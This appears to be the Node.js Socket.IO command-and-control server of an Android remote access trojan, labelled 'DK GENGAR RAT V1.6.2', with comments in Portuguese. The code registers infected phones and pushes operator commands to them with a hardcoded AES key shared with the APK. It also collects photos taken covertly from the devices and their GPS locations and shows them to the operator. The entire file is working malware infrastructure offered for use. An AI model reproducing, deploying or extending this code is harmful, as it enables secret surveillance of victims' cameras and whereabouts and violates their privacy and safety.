const express = require("express");
const http = require("http");
const socketIo = require("socket.io");
const path = require("path");
const crypto = require("crypto");

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    maxHttpBufferSize: 1e8 // 100MB para fotos
});

// Chave e IV para AES (Devem ser iguais aos do APK)
const SECRET_KEY_STRING = "aGVsbG93b3JsZHNlY3JldGtleQ=="; 
const IV_STRING = "aGVsbG93b3JsZGl2"; 

function decrypt(encryptedValue) {
    try {
        const key = Buffer.from(SECRET_KEY_STRING, 'base64');
        const iv = Buffer.from(IV_STRING, 'base64');
        const encryptedText = Buffer.from(encryptedValue, 'base64');
        const decipher = crypto.createDecipheriv('aes-128-cbc', key, iv);
        let decrypted = decipher.update(encryptedText);
        decrypted = Buffer.concat([decrypted, decipher.final()]);
        return decrypted.toString();
    } catch (e) {
        console.error("[ERRO DESCRIPTOGRAFIA]", e.message);
        return null;
    }
}

function encrypt(value) {
    try {
        const key = Buffer.from(SECRET_KEY_STRING, 'base64');
        const iv = Buffer.from(IV_STRING, 'base64');
        const cipher = crypto.createCipheriv('aes-128-cbc', key, iv);
        let encrypted = cipher.update(value, 'utf8', 'base64');
        encrypted += cipher.final('base64');
        return encrypted;
    } catch (e) {
        return value;
    }
}

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

app.get("/health", (req, res) => {
    res.status(200).send("OK");
});

io.on("connection", (socket) => {
    console.log(`[SISTEMA] Nova conexão: ${socket.id}`);

    // Registro simplificado para garantir que o dispositivo apareça
    socket.on("register", (data) => {
        try {
            // Se for string, tenta descriptografar. Se for objeto, usa direto.
            let finalData = data;
            if (typeof data === 'string') {
                const decrypted = decrypt(data);
                if (decrypted) finalData = JSON.parse(decrypted);
                else finalData = JSON.parse(data); // Tenta JSON puro
            }
            
            console.log(`[REGISTRO] Dispositivo: ${finalData.model} | OS: ${finalData.os}`);
            socket.deviceData = finalData;
            io.emit("new_device", finalData);
        } catch (e) {
            console.error("[ERRO REGISTRO]", e.message);
        }
    });

    socket.on("command", (data) => {
        console.log(`[COMANDO] ${data.cmd} enviado`);
        // Envia comando em texto plano e criptografado para compatibilidade total
        const encryptedCmd = encrypt(JSON.stringify(data));
        socket.broadcast.emit("command", {
            plain: data,
            encrypted: encryptedCmd
        });
    });

    socket.on("result", (encryptedData) => {
        const decrypted = decrypt(encryptedData);
        const finalMsg = decrypted ? JSON.parse(decrypted).msg : (typeof encryptedData === 'string' ? encryptedData : JSON.stringify(encryptedData));
        io.emit("server_log", finalMsg);
    });

    socket.on("photo_captured", (encryptedData) => {
        const decrypted = decrypt(encryptedData);
        if (decrypted) {
            const data = JSON.parse(decrypted);
            io.emit("display_photo", data.image);
            io.emit("server_log", "📸 Foto recebida!");
        }
    });

    socket.on("location_received", (encryptedData) => {
        const decrypted = decrypt(encryptedData);
        if (decrypted) {
            const data = JSON.parse(decrypted);
            io.emit("display_location", data);
            io.emit("server_log", `📍 Localização: ${data.lat}, ${data.lon}`);
        }
    });

    socket.on("disconnect", () => {
        console.log(`[SISTEMA] Conexão encerrada: ${socket.id}`);
    });
});

const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
    console.log(`DK GENGAR RAT V1.6.2 rodando na porta ${PORT}`);
});
